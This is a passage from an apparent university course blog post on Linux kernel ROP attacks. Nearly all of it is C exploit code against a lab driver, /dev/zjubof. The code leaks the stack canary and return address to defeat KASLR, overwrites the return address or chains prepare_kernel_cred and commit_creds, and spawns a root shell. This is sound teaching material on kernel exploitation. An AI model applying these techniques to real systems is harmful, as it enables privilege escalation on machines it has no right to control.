0xffff8000107abe54; char canaryStr[8]; char oldFPStr[8]; // fp of zjubof_write2 char oldRAStr[8]; // ra of zjubof_write3 -\u0026gt; zjubof_write2 size_t getOffset(int fd) { size_t len = 0; char buf[49] = \u0026#34;0123456789ABCDEF\\x30\u0026#34;; // cmd.command = \u0026#34;0123456789ABCDEF\u0026#34;, cmd.length = 0x30 len = write(fd, buf, 24); // // 16 + 8 B len = read(fd, buf, 48); // CMD_LENGTH = 49, len \u0026lt; 49 memset(canaryStr, \u0026#39;\\0\u0026#39;, sizeof(canaryStr)); memcpy(canaryStr, buf+24, 8); memset(oldFPStr, \u0026#39;\\0\u0026#39;, sizeof(oldFPStr)); memcpy(oldFPStr, buf+32, 8); memset(oldRAStr, \u0026#39;\\0\u0026#39;, sizeof(oldRAStr)); memcpy(oldRAStr, buf+40, 8); size_t canary = *(size_t *) canaryStr; size_t oldFP = *(size_t *) oldFPStr; size_t oldRA = *(size_t *) oldRAStr; printf(\u0026#34;canary = 0x%lx\\n\u0026#34;, canary); printf(\u0026#34;oldFP = 0x%lx\\n\u0026#34;, oldFP); printf(\u0026#34;oldRA = 0x%lx\\n\u0026#34;, oldRA); size_t offset = oldRA - RAWithoutKASLR; printf(\u0026#34;offset = 0x%lx\\n\u0026#34;, offset); return offset; } void hackUsingFirstLevelGadget(int fd, size_t offset) { char buf[49] = \u0026#34;0123456789ABCDEF\\x30\u0026#34;; size_t newRA = RAToFirstLevelGadget + offset; memcpy(buf + 24, canaryStr, 8); memcpy(buf + 32, oldFPStr, 8); memcpy(buf + 40, (char*)\u0026amp;newRA, 8); write(fd, buf, 48); system(\u0026#34;/bin/sh\u0026#34;); return; } void hackUsingROP(int fd, size_t offset) { char buf[161]; memset(buf, \u0026#39;\\0\u0026#39;, sizeof(buf)); memcpy(buf + 24, canaryStr, 8); size_t prepareKernelCredRA = RAOfPrepareKernelCred + offset; memcpy(buf + 40, (char*)\u0026amp;prepareKernelCredRA, 8); size_t commitCredsRA = RAOfCommitCreds + offset; memcpy(buf + 72, (char*)\u0026amp;commitCredsRA, 8); size_t secondLevelGadgetRA = RAOfSecondLevelGadget + offset; memcpy(buf + 104, (char*)\u0026amp;secondLevelGadgetRA, 8); size_t ZJUBofWriteRA = RAOfZJUBofWrite + offset; memcpy(buf + 152, (char*)\u0026amp;ZJUBofWriteRA, 8); write(fd, buf, 160); system(\u0026#34;/bin/sh\u0026#34;); return; } int main(int argc, char *argv[]) { int fd = open(\u0026#34;/dev/zjubof\u0026#34;, O_RDWR); size_t offset = getOffset(fd); hackUsingFirstLevelGadget(fd, offset); // hackUsingROP(fd, offset); return 0; } Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-07T22:50:00Z","image":"https://unicocn.github.io/p/rop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_120x120_fill_q75_box_smart1.jpg","permalink":"https://unicocn.github.io/p/rop/","title":"ROP | Linux内核攻防"}]